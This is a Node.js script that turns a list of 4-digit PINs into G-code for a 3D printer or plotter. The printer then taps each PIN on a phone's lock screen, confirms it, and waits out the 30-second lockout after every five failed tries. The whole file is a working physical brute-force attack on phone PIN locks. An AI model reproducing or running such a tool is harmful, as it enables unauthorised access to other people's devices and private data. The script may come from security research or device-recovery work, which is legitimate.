const fs = require('fs')

var finalFileName = 'bruteforce.gcode'

fs.readFile('./optimised-pin-length-4.txt', 'utf8' , (err, data) => {
  if (err) {
    console.error(err)
    return
  }

  if(fs.existsSync(finalFileName)) {
    fs.unlinkSync(finalFileName);
  }
  var fileWriter = fs.createWriteStream(finalFileName, {
    flags: 'a' // 'a' means appending (old data will be preserved)
  })

  //Y between 1,8cm
  //X betwen 1cm

  const HOME = "G0 X0 Y0 Z0"
  const button_0 = "G0 X18 Y0"
  const button_1 = "G0 X0 Y30"
  const button_2 = "G0 X18 Y30"
  const button_3 = "G0 X36 Y30"
  const button_4 = "G0 X0 Y20"
  const button_5 = "G0 X18 Y20"
  const button_6 = "G0 X36 Y20"
  const button_7 = "G0 X0 Y10"
  const button_8 = "G0 X18 Y10"
  const button_9 = "G0 X36 Y10"
  const button_OK = "G0 X0 Y0"
  const button_POPUP = "G0 X20 Y18"
  const button_BACK = "G0 X36 Y0"
  const PRESS_BUTTON = "G1 Z10"
  const RELEASE_BUTTON = "G1 Z30"

  const writeMove = (move) => {
    fileWriter.write(move)
    fileWriter.write("\r\n")
  }

  var counter = 1
  //Header Title
  fileWriter.write(";Bruteforce GCODE leet stuff")
  fileWriter.write("\r\n")

  //home
  fileWriter.write("G28")
  fileWriter.write("\r\n")

  //Set this point to be the grid we work on now
  fileWriter.write("M1 \"Ready?\" ")
  fileWriter.write("\r\n")

  //Set unit to mm
  fileWriter.write("G21")
  fileWriter.write("\r\n")

  //Move to predefined entry point
  fileWriter.write("G0 X100 Y100 Z30")
  fileWriter.write("\r\n")

  //Set this point to be the grid we work on now
  fileWriter.write("M1 \"Press knob when phone is positioned over 0 Button\" ")
  fileWriter.write("\r\n")

  //Set this point to be the grid we work on now
  fileWriter.write("G92 X0 Y0 Z30")
  fileWriter.write("\r\n")
  
  //Set this point to be the grid we work on now
  fileWriter.write("G90")
  fileWriter.write("\r\n")

  //Read all the possible pins and build the gcode file
  data.split(/\r?\n/).forEach(function(line) {
    fileWriter.write(";PIN Number:" + line)
    fileWriter.write("\r\n")
    for (const number of line) {
      switch(number) {
        case "0":
          writeMove(button_0)
          break;
        case "1":
          writeMove(button_1)
          break;
        case "2":
          writeMove(button_2)
          break;
        case "3":
          writeMove(button_3)
          break;
        case "4":
          writeMove(button_4)
          break;
        case "5":
          writeMove(button_5)
          break;
        case "6":
          writeMove(button_6)
          break;
        case "7":
          writeMove(button_7)
          break;
        case "8":
          writeMove(button_8)
          break; 
        case "9":
          writeMove(button_9)
          break;                                                       
      }
      //press the button
      writeMove(PRESS_BUTTON)
      writeMove(RELEASE_BUTTON)
    }
    //press ok after 4 digits
    writeMove(button_OK)
    writeMove(PRESS_BUTTON)
    writeMove(RELEASE_BUTTON)

    //press the 30sec popup after 5 entries
    if(counter%5 == 0 ) {
      writeMove(button_POPUP)
      writeMove(PRESS_BUTTON)
      writeMove(RELEASE_BUTTON)
      fileWriter.write(";Waiting for Backoff after 5 entries")
      fileWriter.write("\r\n")
      writeMove(button_BACK)
      for (let index = 0; index < 15; index++) {
        writeMove("G4 P2000")
        writeMove(PRESS_BUTTON)
        writeMove(RELEASE_BUTTON)
      }
    }
    counter++
  })
  fileWriter.end()
  console.log("Wrote gcode for " + counter + " codes.")
});
